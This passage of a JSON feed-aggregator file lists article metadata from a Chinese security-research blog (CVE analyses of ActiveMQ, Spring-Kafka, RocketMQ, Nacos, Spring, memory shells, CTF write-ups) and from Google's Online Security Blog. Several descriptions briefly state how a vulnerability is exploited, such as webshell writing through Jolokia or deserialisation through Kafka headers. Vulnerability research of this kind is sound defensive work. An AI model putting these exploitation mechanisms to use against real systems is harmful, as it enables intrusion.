          "link": "https://l3yx.github.io/2023/12/03/%E9%80%9A%E8%BF%87JDWP%E6%BC%8F%E6%B4%9E%E6%B3%A8%E5%85%A5%E4%B8%8D%E4%B8%80%E6%A0%B7%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC/",
          "publishedOn": "2023-12-03T10:03:42.000Z",
          "wordCount": 657,
          "title": "通过JDWP漏洞注入\"不一样\"的内存马",
          "imageUrl": "https://l3yx.github.io/2023/12/03/%E9%80%9A%E8%BF%87JDWP%E6%BC%8F%E6%B4%9E%E6%B3%A8%E5%85%A5%E4%B8%8D%E4%B8%80%E6%A0%B7%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC/image-20231203201646530.png"
        },
        {
          "id": "https://l3yx.github.io/2023/11/29/Apache-ActiveMQ-Jolokia-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2022-41678-%E5%88%86%E6%9E%90/",
          "author": null,
          "description": "<p>ActiveMQ中，经过身份验证的用户默认情况下可以通过<code>/api/jolokia/</code>接口操作MBean，其中FlightRecorder可以被用于写Jsp WebShell，从而造成远程代码执行漏洞</p>\n<p>FlightRecorder存在于Jdk 11+，具体类名：<code>jdk.management.jfr.FlightRecorderMXBeanImpl</code></p>",
          "link": "https://l3yx.github.io/2023/11/29/Apache-ActiveMQ-Jolokia-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2022-41678-%E5%88%86%E6%9E%90/",
          "publishedOn": "2023-11-29T09:43:45.000Z",
          "wordCount": 506,
          "title": "Apache ActiveMQ Jolokia 远程代码执行漏洞(CVE-2022-41678)分析",
          "imageUrl": "https://l3yx.github.io/2023/11/29/Apache-ActiveMQ-Jolokia-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2022-41678-%E5%88%86%E6%9E%90/image-20220730133512058.png"
        },
        {
          "id": "https://l3yx.github.io/2023/09/28/Spring-Kafka-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2023-34040-%E5%88%86%E6%9E%90/",
          "author": null,
          "description": "<p>当受影响版本的 Spring-Kafka Consumer 未对Record配置 ErrorHandlingDeserializer 并设置 checkDeserExWhenKeyNull 或 checkDeserExWhenValueNull 为 true 且攻击者可以发布 Kafka 消息时，将会存在Java反序列化漏洞。只需发布 key 或 value 为 null 的消息，且在相应的header中放入序列化数据，便可以任意反序列化</p>",
          "link": "https://l3yx.github.io/2023/09/28/Spring-Kafka-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2023-34040-%E5%88%86%E6%9E%90/",
          "publishedOn": "2023-09-28T03:45:34.000Z",
          "wordCount": 887,
          "title": "Spring-Kafka 反序列化漏洞(CVE-2023-34040)分析",
          "imageUrl": "https://l3yx.github.io/2023/09/28/Spring-Kafka-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2023-34040-%E5%88%86%E6%9E%90/image-20230928181513185.png"
        },
        {
          "id": "https://l3yx.github.io/2023/09/06/Docker%E7%BC%96%E8%AF%91OpenJDK-CodeQL%E6%95%B0%E6%8D%AE%E5%BA%93/",
          "author": null,
          "description": "<p>通过Docker编译OpenJDK源码，并生成CodeQL数据库。之前编译过JDK，不过没留存环境，重复手动构建编译环境有点麻烦，这次顺便记录一下编译过程及Dockerfile</p>",
          "link": "https://l3yx.github.io/2023/09/06/Docker%E7%BC%96%E8%AF%91OpenJDK-CodeQL%E6%95%B0%E6%8D%AE%E5%BA%93/",
          "publishedOn": "2023-09-06T14:38:37.000Z",
          "wordCount": 464,
          "title": "Docker编译OpenJDK CodeQL数据库",
          "imageUrl": "https://l3yx.github.io/2023/09/06/Docker%E7%BC%96%E8%AF%91OpenJDK-CodeQL%E6%95%B0%E6%8D%AE%E5%BA%93/image-20230908132515211.png"
        },
        {
          "id": "https://l3yx.github.io/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/",
          "author": null,
          "description": "<p>最近学了下Go，也准备挖一下Go WEB应用的漏洞。梳理了Grafana的结构，调试分析了Grafana的一些历史漏洞及修复方案，也在分析过程中挖到了新的。感觉Go语言确实是比较安全的，很多漏洞其实都是代码逻辑上的问题</p>",
          "link": "https://l3yx.github.io/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/",
          "publishedOn": "2023-08-06T08:31:15.000Z",
          "wordCount": 1347,
          "title": "Grafana 历史漏洞分析",
          "imageUrl": "https://l3yx.github.io/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230808205929971.png"
        },
        {
          "id": "https://l3yx.github.io/2023/06/15/RocketMQ-5-1-1%E5%86%99%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1RCE/",
          "author": null,
          "description": "<p><a href=\"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-33246\" target=\"_blank\" rel=\"noopener\">CVE-2023-33246</a> 是通过<code>updateBrokerConfig</code>更新Broker的<code>filterServerNums</code>和<code>rocketmqHome</code>这两项配置进行RCE的（<code>rocketmqHome</code>会被拼接到命令中执行，<code>filterServerNums</code>&gt;0 是进入命令执行的前提条件）</p>\n<p>修复的逻辑是直接删除相关代码</p>\n<p>但从仓库的修复代码来看，还存在另一处RCE的点，不过官方只发布了上述一个CVE编号</p>",
          "link": "https://l3yx.github.io/2023/06/15/RocketMQ-5-1-1%E5%86%99%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1RCE/",
          "publishedOn": "2023-06-15T14:18:18.000Z",
          "wordCount": 878,
          "title": "RocketMQ 5.1.1写计划任务RCE",
          "imageUrl": null
        },
        {
          "id": "https://l3yx.github.io/2023/06/09/Nacos-Raft-Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/",
          "author": null,
          "description": "<p>Nacos默认的7848端口是用于Nacos集群间Raft协议的通信，该端口的服务在处理部分Jraft请求时会使用Hessian进行反序列化</p>",
          "link": "https://l3yx.github.io/2023/06/09/Nacos-Raft-Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/",
          "publishedOn": "2023-06-09T07:07:54.000Z",
          "wordCount": 869,
          "title": "Nacos Raft Hessian反序列化漏洞分析",
          "imageUrl": "https://l3yx.github.io/2023/06/09/Nacos-Raft-Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230607232842205.png"
        },
        {
          "id": "https://l3yx.github.io/2023/05/20/Tabby%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96gadget%E5%88%86%E6%9E%90/",
          "author": null,
          "description": "<p>Tabby学习笔记，挖掘反序列化gadget的思路和一些链的详细分析及POC</p>",
          "link": "https://l3yx.github.io/2023/05/20/Tabby%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96gadget%E5%88%86%E6%9E%90/",
          "publishedOn": "2023-05-20T09:57:26.000Z",
          "wordCount": 1385,
          "title": "Tabby学习笔记 & Java反序列化gadget分析",
          "imageUrl": "https://l3yx.github.io/2023/05/20/Tabby%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96gadget%E5%88%86%E6%9E%90/image-20230520230016662.png"
        },
        {
          "id": "https://l3yx.github.io/2023/05/05/Apache-Jena-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2023-22665/",
          "author": null,
          "description": "<p>ARQ是Jena的一个查询引擎，它支持SPARQLRDF查询语言，同时也支持JavaScript。当Jena应用的SPARQL语句被外部可控时，将会造成任意代码执行漏洞。</p>",
          "link": "https://l3yx.github.io/2023/05/05/Apache-Jena-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2023-22665/",
          "publishedOn": "2023-05-05T12:07:50.000Z",
          "wordCount": 579,
          "title": "Apache Jena 代码执行漏洞(CVE-2023-22665)",
          "imageUrl": null
        },
        {
          "id": "https://l3yx.github.io/2022/12/24/Apache-Archiva-%E4%BB%BB%E6%84%8F%E7%9B%AE%E5%BD%95%E5%88%A0%E9%99%A4-CVE-2022-40309-%E5%92%8C-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96-CVE-2022-40308/",
          "author": null,
          "description": "<p>Apache Archiva是一个存储库管理软件，2.2.9以下版本在删除或者下载Artifact时，可以在目录或者文件名中注入目录穿越符，导致任意目录删除/任意文件读取漏洞。</p>",
          "link": "https://l3yx.github.io/2022/12/24/Apache-Archiva-%E4%BB%BB%E6%84%8F%E7%9B%AE%E5%BD%95%E5%88%A0%E9%99%A4-CVE-2022-40309-%E5%92%8C-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96-CVE-2022-40308/",
          "publishedOn": "2022-12-24T02:20:22.000Z",
          "wordCount": 624,
          "title": "Apache Archiva 任意目录删除(CVE-2022-40309) 和 任意文件读取(CVE-2022-40308)",
          "imageUrl": "https://l3yx.github.io/2022/12/24/Apache-Archiva-%E4%BB%BB%E6%84%8F%E7%9B%AE%E5%BD%95%E5%88%A0%E9%99%A4-CVE-2022-40309-%E5%92%8C-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96-CVE-2022-40308/image-20221224112101909.png"
        },
        {
          "id": "https://l3yx.github.io/2022/12/17/%E7%94%A8CodeQL%E5%88%86%E6%9E%90%E6%BC%8F%E6%B4%9E-CVE-2022-42889/",
          "author": null,
          "description": "<p>Apache Commons Text 是专门用来处理文本的一个库，据文档介绍其支持<a href=\"https://commons.apache.org/proper/commons-text/apidocs/org/apache/commons/text/lookup/StringLookupFactory.html\" target=\"_blank\" rel=\"noopener\">变量插值</a>。在1.5 - 1.9版本默认支持”script”类型的插值，于是可以造成任意代码执行，也就是CVE-2022-42889。</p>",
          "link": "https://l3yx.github.io/2022/12/17/%E7%94%A8CodeQL%E5%88%86%E6%9E%90%E6%BC%8F%E6%B4%9E-CVE-2022-42889/",
          "publishedOn": "2022-12-17T05:40:37.000Z",
          "wordCount": 720,
          "title": "用CodeQL分析漏洞_CVE-2022-42889",
          "imageUrl": "https://l3yx.github.io/2022/12/17/%E7%94%A8CodeQL%E5%88%86%E6%9E%90%E6%BC%8F%E6%B4%9E-CVE-2022-42889/image-20221217154807090.png"
        },
        {
          "id": "https://l3yx.github.io/2022/07/21/Spring-Framework-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-CVE-2010-1622/",
          "author": null,
          "description": "<p>Spring Framework 通过内省实现了参数绑定，可以将HTTP请求中的请求参数或者请求体内容，根据 Controller方法的参数，自动完成类型转换和赋值，导致可以覆盖classLoader中的属性，通过修改Tomcat WebappClassLoader 中的 repositoryURLs 让应用程序加载自定义jar包从而造成代码执行漏洞。</p>",
          "link": "https://l3yx.github.io/2022/07/21/Spring-Framework-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-CVE-2010-1622/",
          "publishedOn": "2022-07-21T13:59:35.000Z",
          "wordCount": 1399,
          "title": "Spring Framework 代码执行(CVE-2010-1622)",
          "imageUrl": "https://l3yx.github.io/2022/07/21/Spring-Framework-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-CVE-2010-1622/image-20220721223847329.png"
        },
        {
          "id": "https://l3yx.github.io/2022/07/16/Spring-Security-%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87-CVE-2022-22978/",
          "author": null,
          "description": "<p>在Java中正则表达式<code>.</code>默认不包含<code>\\n</code> 和<code>\\r</code>，需要设置<code>DOTALL</code>才会匹配所有字符。而<code>Spring Security</code>在通过正则设置路由权限时，未设置<code>DOTALL</code>，导致某些情况下可以通过<code>\\n</code> 和<code>\\r</code>来绕过权限控制。</p>",
          "link": "https://l3yx.github.io/2022/07/16/Spring-Security-%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87-CVE-2022-22978/",
          "publishedOn": "2022-07-16T09:50:45.000Z",
          "wordCount": 386,
          "title": "Spring Security 权限绕过(CVE-2022-22978)",
          "imageUrl": "https://l3yx.github.io/2022/07/16/Spring-Security-%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87-CVE-2022-22978/image-20220716203325350.png"
        },
        {
          "id": "https://l3yx.github.io/2022/05/14/GitHub-Security-Lab-CTF-CodeQL-and-Chill/",
          "author": null,
          "description": "<p>这是GitHub Security Lab CTF的一道<a href=\"https://securitylab.github.com/ctf/codeql-and-chill/\" target=\"_blank\" rel=\"noopener\">题目</a>，利用CodeQL挖掘<a href=\"https://securitylab.github.com/advisories/GHSL-2020-028-netflix-titus/\" target=\"_blank\" rel=\"noopener\">Netflix Titus服务端模板注入</a>漏洞。</p>",
          "link": "https://l3yx.github.io/2022/05/14/GitHub-Security-Lab-CTF-CodeQL-and-Chill/",
          "publishedOn": "2022-05-14T07:58:37.000Z",
          "wordCount": 1610,
          "title": "GitHub Security Lab CTF: CodeQL and Chill",
          "imageUrl": "https://l3yx.github.io/2022/05/14/GitHub-Security-Lab-CTF-CodeQL-and-Chill/image-20220515222307815.png"
        },
        {
          "id": "https://l3yx.github.io/2022/03/05/CodeQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/",
          "author": null,
          "description": "<p>CodeQL学习笔记，大部分翻译自官方文档</p>",
          "link": "https://l3yx.github.io/2022/03/05/CodeQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/",
          "publishedOn": "2022-03-05T11:05:02.000Z",
          "wordCount": 2670,
          "title": "CodeQL学习笔记",
          "imageUrl": null
        },
        {
          "id": "https://l3yx.github.io/2021/12/02/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Ethernaut/",
          "author": null,
          "description": "<p>Solidity基础可以先看这个互动式教程：<a href=\"https://cryptozombies.io/zh/\" target=\"_blank\" rel=\"noopener\">https://cryptozombies.io/zh/</a> ，以及<a href=\"https://solidity-by-example.org/\" target=\"_blank\" rel=\"noopener\">https://solidity-by-example.org/</a></p>\n<p>Ethernaut是一个智能合约漏洞靶场</p>\n<p>项目地址：<a href=\"https://github.com/OpenZeppelin/ethernaut\" target=\"_blank\" rel=\"noopener\">https://github.com/OpenZeppelin/ethernaut</a></p>\n<p>在线靶场：<a href=\"https://ethernaut.openzeppelin.com\" target=\"_blank\" rel=\"noopener\">https://ethernaut.openzeppelin.com</a></p>",
          "link": "https://l3yx.github.io/2021/12/02/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Ethernaut/",
          "publishedOn": "2021-12-02T14:26:11.000Z",
          "wordCount": 4206,
          "title": "智能合约漏洞靶场——Ethernaut",
          "imageUrl": "https://l3yx.github.io/2021/12/02/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Ethernaut/image-20211204213024493.png"
        },
        {
          "id": "https://l3yx.github.io/2020/09/04/DDCTF-2020-WEB-WriteUp/",
          "author": null,
          "description": "<p>DDCTF 2020 WEB WriteUp</p>",
          "link": "https://l3yx.github.io/2020/09/04/DDCTF-2020-WEB-WriteUp/",
          "publishedOn": "2020-09-04T12:38:03.000Z",
          "wordCount": 923,
          "title": "DDCTF 2020 WEB WriteUp",
          "imageUrl": "https://l3yx.github.io/2020/09/04/DDCTF-2020-WEB-WriteUp/image-20200904205954880.png"
        },
        {
          "id": "https://l3yx.github.io/2020/08/27/%E4%B8%A4%E5%88%99JSON-CSRF%E5%AE%9E%E4%BE%8B/",
          "author": null,
          "description": "<p>最近面试被问到JSON CSRF，还刚好挖过他们家SRC两个实际案例，当时挖洞的时候也特地去查过JSON CSRF的资料，可面试的时候怎么也没想起来，遂翻出以前SRC的报告记录一下再整理下JSON CSRF的利用方法</p>",
          "link": "https://l3yx.github.io/2020/08/27/%E4%B8%A4%E5%88%99JSON-CSRF%E5%AE%9E%E4%BE%8B/",
          "publishedOn": "2020-08-27T13:36:55.000Z",
          "wordCount": 450,
          "title": "两则JSON CSRF实例",
          "imageUrl": "https://l3yx.github.io/2020/08/27/%E4%B8%A4%E5%88%99JSON-CSRF%E5%AE%9E%E4%BE%8B/image-20200827230154850.png"
        }
      ]
    },
    {
      "title": "Google Online Security Blog",
      "feedUrl": "http://googleonlinesecurity.blogspot.com/feeds/posts/default",
      "siteUrl": "http://security.googleblog.com/",
      "articles": [
        {
          "id": "http://security.googleblog.com/2024/08/keeping-your-android-device-safe-from.html",
          "author": null,
          "description": "Posted by Nataliya Stanetsky and Roger Piqueras Jover, Android Security & Privacy Team\n\n\nCell-site simulators, also known as False Base Stations (FBS) or Stingrays, are radio devices that mimic real cell sites in order to lure mobile devices to connect to them. These devices are commonly used for security and privacy attacks, such as surveillance and interception of communications. In recent years, carriers have started reporting new types of abuse perpetrated with FBSs for the purposes of financial fraud.\n\n\nIn particular, there is increasingly more evidence of the exploitation of weaknesses in cellular communication standards leveraging cell-site simulators to inject SMS phishing messages directly into smartphones. This method to inject messages entirely bypasses the carrier network, thus…",
          "link": "http://security.googleblog.com/2024/08/keeping-your-android-device-safe-from.html",
          "publishedOn": "2024-08-01T17:08:00.002Z",
          "wordCount": 6304,
          "title": "Keeping your Android device safe from text message fraud",
          "imageUrl": "http://2.bp.blogspot.com/-7bZ5EziliZQ/VynIS9F7OAI/AAAAAAAASQ0/BJFntXCAntstZe6hQuo5KTrhi5Dyz9yHgCK4B/s1600/googlelogo_color_200x200.png"
        },
        {
          "id": "http://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html",
          "author": null,
          "description": "Posted by Will Harris, Chrome Security Team\n\n\nCybercriminals using cookie theft infostealer malware continue to pose a risk to the safety and security of our users. We already have a number of initiatives in this area including Chrome’s download protection using Safe Browsing, Device Bound Session Credentials, and Google’s account-based threat detection to flag the use of stolen cookies. Today, we’re announcing another layer of protection to make Windows users safer from this type of malware.\n\n\nLike other software that needs to store secrets, Chrome currently secures sensitive data like cookies and passwords using the strongest techniques the OS makes available to us - on macOS this is the Keychain services, and on Linux we use a system provided wallet such as kwallet or gnome-libsecret. O…",
          "link": "http://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html",
          "publishedOn": "2024-07-30T17:01:00.002Z",
          "wordCount": 5287,
          "title": "Improving the security of Chrome cookies on Windows",
          "imageUrl": "http://2.bp.blogspot.com/-7bZ5EziliZQ/VynIS9F7OAI/AAAAAAAASQ0/BJFntXCAntstZe6hQuo5KTrhi5Dyz9yHgCK4B/s1600/googlelogo_color_200x200.png"
        },
        {
          "id": "http://security.googleblog.com/2024/07/building-security-into-redesigned.html",
          "author": null,
          "description": "Posted by Jasika Bawa, Lily Chen, and Daniel Rubery, Chrome Security\n\n\nLast year, we introduced a redesign of the Chrome downloads experience on desktop to make it easier for users to interact with recent downloads. At the time, we mentioned that the additional space and more flexible UI of the new Chrome downloads experience would give us new opportunities to make sure users stay safe when downloading files. \n\n\nAdding context and consistency to download warnings\n\n\nThe redesigned Chrome downloads experience gives us the opportunity to provide even more context when Chrome protects a user from a potentially malicious file. Taking advantage of the additional space available in the new downloads UI, we have replaced our previous warning messages with more detailed ones that convey more nuance…",
          "link": "http://security.googleblog.com/2024/07/building-security-into-redesigned.html",
          "publishedOn": "2024-07-24T16:00:00.002Z",
          "wordCount": 5760,
          "title": "Building security into the redesigned Chrome downloads experience",
          "imageUrl": "http://2.bp.blogspot.com/-7bZ5EziliZQ/VynIS9F7OAI/AAAAAAAASQ0/BJFntXCAntstZe6hQuo5KTrhi5Dyz9yHgCK4B/s1600/googlelogo_color_200x200.png"
        },
        {
          "id": "http://security.googleblog.com/2024/06/sustaining-digital-certificate-security.html",
          "author": null,
          "description": "Posted by Chrome Root Program, Chrome Security Team\n\n\nUpdate (07/22/2024): Website operators who will be impacted by the upcoming change in Chrome for new TLS certificates issued after October 31, 2024 can explore continuity options offered by Entrust. Entrust has expressed its commitment to continuing to support customer needs, and is best positioned to describe the available options for website operators. Learn more at Entrust’s TLS Certificate Information Center.\n\n\n    \n.code {\n    font-family: \"Courier New\", Courier, monospace;\n    font-size: 11.8px;\n    font-weight: bold;\n    background-color: #f4f4f4;\n    padding: 10px;\n    border: 1px solid #ccc;\n    border-radius: 2px;\n    white-space: pre-wrap;\n    display: inline-block;\n    line-height: 12px;\n}\n.highlight {\n    color: red;\n}\n    …",
          "link": "http://security.googleblog.com/2024/06/sustaining-digital-certificate-security.html",
          "publishedOn": "2024-06-27T17:16:00.001Z",
          "wordCount": 6569,
          "title": "Sustaining Digital Certificate Security - Entrust Certificate Distrust",
          "imageUrl": "http://2.bp.blogspot.com/-7bZ5EziliZQ/VynIS9F7OAI/AAAAAAAASQ0/BJFntXCAntstZe6hQuo5KTrhi5Dyz9yHgCK4B/s1600/googlelogo_color_200x200.png"
        },
        {
          "id": "http://security.googleblog.com/2024/06/virtual-escape-real-reward-introducing.html",
          "author": null,
          "description": "Marios Pomonis, Software Engineer\n\n\nGoogle is committed to enhancing the security of open-source technologies, especially those that make up the foundation for many of our products, like Linux and KVM. To this end we are excited to announce the launch of kvmCTF, a vulnerability reward program (VRP) for the Kernel-based Virtual Machine (KVM) hypervisor first announced in October 2023.\n\n\n\n\n\nKVM is a robust hypervisor with over 15 years of open-source development and is widely used throughout the consumer and enterprise landscape, including platforms such as Android and Google Cloud. Google is an active contributor to the project and we designed kvmCTF as a collaborative way to help identify & remediate vulnerabilities and further harden this fundamental security boundary. \n\n\n\n\n\nSimilar to ke…",
          "link": "http://security.googleblog.com/2024/06/virtual-escape-real-reward-introducing.html",
          "publishedOn": "2024-06-27T17:12:00.004Z",
          "wordCount": 6869,
          "title": "Virtual Escape; Real Reward: Introducing Google’s kvmCTF",
          "imageUrl": "http://2.bp.blogspot.com/-7bZ5EziliZQ/VynIS9F7OAI/AAAAAAAASQ0/BJFntXCAntstZe6hQuo5KTrhi5Dyz9yHgCK4B/s1600/googlelogo_color_200x200.png"
        },
        {
          "id": "http://security.googleblog.com/2024/06/hacking-for-defenders-approaches-to.html",
          "author": null,
          "description": "Oliver Chang, Jonathan Metzman, OSS-Fuzz and Alex Rebert, Security Engineering\n\n\n\n\n\n\nThe US Defense Advanced Research Projects Agency, DARPA, recently kicked off a two-year AI Cyber Challenge (AIxCC), inviting top AI and cybersecurity experts to design new AI systems to help secure major open source projects which our critical infrastructure relies upon. As AI continues to grow, it’s crucial to invest in AI tools for Defenders, and this competition will help advance technology to do so. \n\n\n\n\n\nGoogle’s OSS-Fuzz and Security Engineering teams have been excited to assist AIxCC organizers in designing their challenges and competition framework. We also playtested the competition by building a Cyber Reasoning System (CRS) tackling DARPA’s exemplar challenge. \n\n\n\n\n\nThis blog post will share our …",
          "link": "http://security.googleblog.com/2024/06/hacking-for-defenders-approaches-to.html",
          "publishedOn": "2024-06-25T12:57:00.001Z",
          "wordCount": 13163,
          "title": "Hacking for Defenders: approaches to DARPA’s AI Cyber Challenge",
          "imageUrl": "http://2.bp.blogspot.com/-7bZ5EziliZQ/VynIS9F7OAI/AAAAAAAASQ0/BJFntXCAntstZe6hQuo5KTrhi5Dyz9yHgCK4B/s1600/googlelogo_color_200x200.png"
        },
        {
          "id": "http://security.googleblog.com/2024/06/staying-safe-with-chrome-extensions.html",
          "author": null,
          "description": "Posted by Benjamin Ackerman, Anunoy Ghosh and David Warren, Chrome Security Team \n\n\n    \n.code {\n    background-color: #f4f4f4;\n    border: 1px solid #ccc;\n    border-radius: 4px;\n    padding: 13px;\n\n  \n}\n.highlight {\n    color: red;\n}\n    \n\n\n\n\nChrome extensions can boost your browsing, empowering you to do anything from customizing the look of sites to providing personalized advice when you’re planning a vacation. But as with any software, extensions can also introduce risk. \n\n\nThat’s why we have a team whose only job is to focus on keeping you safe as you install and take advantage of Chrome extensions. Our team:\nProvides you with a personalized summary of the extensions you’ve installed\n\n\nReviews extensions before they’re published on the Chrome Web Store\n\n\nContinuously monitors extensi…",
          "link": "http://security.googleblog.com/2024/06/staying-safe-with-chrome-extensions.html",
          "publishedOn": "2024-06-20T16:20:00.000Z",
          "wordCount": 5980,
          "title": "Staying Safe with Chrome Extensions",
          "imageUrl": "http://2.bp.blogspot.com/-7bZ5EziliZQ/VynIS9F7OAI/AAAAAAAASQ0/BJFntXCAntstZe6hQuo5KTrhi5Dyz9yHgCK4B/s1600/googlelogo_color_200x200.png"
        },
        {
          "id": "http://security.googleblog.com/2024/06/time-to-challenge-yourself-in-2024.html",
          "author": null,
          "description": "Hlynur Gudmundsson, Software Engineer\n\n\nIt’s Google CTF time! Install your tools, commit your scripts, and clear your schedule. The competition kicks off on June 21 2024 6:00 PM UTC and runs through June 23 2024 6:00 PM UTC. Registration is now open at goo.gle/ctf.\n\n\nJoin the Google CTF (at goo.gle/ctf), a thrilling arena to showcase your technical prowess. The Google CTF consists of a set of computer security puzzles (or challenges) involving reverse-engineering, memory corruption, cryptography, web technologies, and more. Participants can use obscure security knowledge to find exploits through bugs and creative misuse, and with each completed challenge your team will earn points and move up through the ranks. \n\n\n\n\n\nThe top 8 teams of the Google CTF will qualify for our Hackceler8 competi…",
          "link": "http://security.googleblog.com/2024/06/time-to-challenge-yourself-in-2024.html",
          "publishedOn": "2024-06-12T19:37:00.008Z",
          "wordCount": 6881,
          "title": "Time to challenge yourself in the 2024 Google CTF",
          "imageUrl": "http://2.bp.blogspot.com/-7bZ5EziliZQ/VynIS9F7OAI/AAAAAAAASQ0/BJFntXCAntstZe6hQuo5KTrhi5Dyz9yHgCK4B/s1600/googlelogo_color_200x200.png"
        },
        {
          "id": "http://security.googleblog.com/2024/05/on-fire-drills-and-phishing-tests.html",
          "author": null,
          "description": "Matt Linton, Chaos Specialist\n\n\n\n\nIn the late 19th and early 20th century, a series of catastrophic fires in short succession led an outraged public to demand action from the budding fire protection industry. Among the experts, one initial focus was on “Fire Evacuation Tests”. The earliest of these tests focused on individual performance and tested occupants on their evacuation speed, sometimes performing the tests “by surprise” as though the fire drill were a real fire. These early tests were more likely to result in injuries to the test-takers than any improvement in survivability. It wasn’t until introducing better protective engineering - wider doors, push bars at exits, firebreaks in construction, lighted exit signs, and so on - that survival rates from building fires began to improve…",
          "link": "http://security.googleblog.com/2024/05/on-fire-drills-and-phishing-tests.html",
          "publishedOn": "2024-05-22T16:09:00.005Z",
          "wordCount": 10606,
          "title": "On Fire Drills and Phishing Tests",
          "imageUrl": "http://2.bp.blogspot.com/-7bZ5EziliZQ/VynIS9F7OAI/AAAAAAAASQ0/BJFntXCAntstZe6hQuo5KTrhi5Dyz9yHgCK4B/s1600/googlelogo_color_200x200.png"
        },
        {
          "id": "http://security.googleblog.com/2024/05/io-2024-whats-new-in-android-security.html",
          "author": null,
          "description": "Posted by Dave Kleidermacher, VP Engineering, Android Security and Privacy\n\n\n\nOur commitment to user safety is a top priority for Android. We’ve been consistently working to stay ahead of the world’s scammers, fraudsters and bad actors. And as their tactics evolve in sophistication and scale, we continually adapt and enhance our advanced security features and AI-powered protections to help keep Android users safe. \n\n\nIn addition to our new suite of advanced theft protection features to help keep your device and data safe in the case of theft, we’re also focusing increasingly on providing additional protections against mobile financial fraud and scams. \nGoogle Play Protect live threat detection\n\n\nGoogle Play Protect now scans 200 billion Android apps daily, helping keep more than 3 billion …",
          "link": "http://security.googleblog.com/2024/05/io-2024-whats-new-in-android-security.html",
          "publishedOn": "2024-05-15T16:59:00.000Z",
          "wordCount": 6545,
          "title": "I/O 2024: What’s new in Android security and privacy",
          "imageUrl": "http://2.bp.blogspot.com/-7bZ5EziliZQ/VynIS9F7OAI/AAAAAAAASQ0/BJFntXCAntstZe6hQuo5KTrhi5Dyz9yHgCK4B/s1600/googlelogo_color_200x200.png"
        },
        {
          "id": "http://security.googleblog.com/2024/05/google-and-apple-deliver-support-for.html",
          "author": null,
          "description": "Detecting Unwanted Location Trackers – for Bluetooth tracking devices that makes it possible to alert users across both Android and iOS if such a device is unknowingly being used to track them. This will help mitigate the misuse of devices designed to help keep track of belongings. Google is now launching this capability on Android 6.0+ devices, and today Apple is implementing this capability in iOS 17.5.\nMulti-layered user protections, including first of its kind safety-first protections, help mitigate potential risks to user privacy and safety while allowing users to effectively locate and recover lost devices. This cross-platform collaboration — an industry first, involving community and industry input — offers instructions and best practices for manufacturers, should they choose to build unwanted tracking alert capabilities into their products. Google and Apple will continue to work with the Internet Engineering Task Force via the Detecting Unwanted Location Trackers working group to develop the official standard for this technology.",
          "link": "http://security.googleblog.com/2024/05/google-and-apple-deliver-support-for.html",
          "publishedOn": "2024-05-13T17:00:00.001Z",
          "wordCount": 4578,
          "title": "Google and Apple deliver support for unwanted tracking alerts in Android and iOS",
